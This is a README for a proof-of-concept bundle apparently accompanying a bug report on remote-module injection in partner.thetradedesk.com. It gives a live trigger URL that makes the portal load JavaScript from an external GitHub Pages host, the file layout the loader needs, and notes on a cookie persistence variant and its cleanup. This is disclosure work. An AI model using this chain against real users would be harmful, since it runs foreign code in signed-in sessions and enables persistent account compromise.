PoC files for the partner.thetradedesk.com AFE remote-module injection report.

LIVE INSTANCE
    https://kyuda1-0.github.io/ttd-xss-poc/afe

TRIGGER (while signed in to the Partner Portal)
    https://partner.thetradedesk.com/v3/portal/access-requests?access-requests-version=https://kyuda1-0.github.io/ttd-xss-poc/afe

LAYOUT — the two files sit at different relative offsets. With base B = <param>/ the
loader fetches new URL("../versionManifest.js", B) and new URL("entry.js?cb=1", B):

    /versionManifest.js        <- ../versionManifest.js
    /afe/entry.js              <- entry.js

FILES
    versionManifest.js      required by the loader before entry.js
    afe/entry.js            structured PoC, read-only, prints the numbered chain [1]-[7]
    afe/entry-readonly.js   extended read-only privilege probe (report section 6.4)
    afe/entry-persistence.js persistence demo (report section 5)

To swap which payload runs, copy the wanted file over afe/entry.js.

Both must be served as Content-Type: application/javascript with
Access-Control-Allow-Origin: * — GitHub Pages does both by default.

COOKIE VARIANT needs a different layout, because the cookie is reduced to its origin:
    <host>/afes/releases/access-requests/versionManifest.js
    <host>/afes/releases/access-requests/production/entry.js

CLEANUP after running the persistence demo:
    document.cookie = "cdnPath=; path=/; max-age=0"
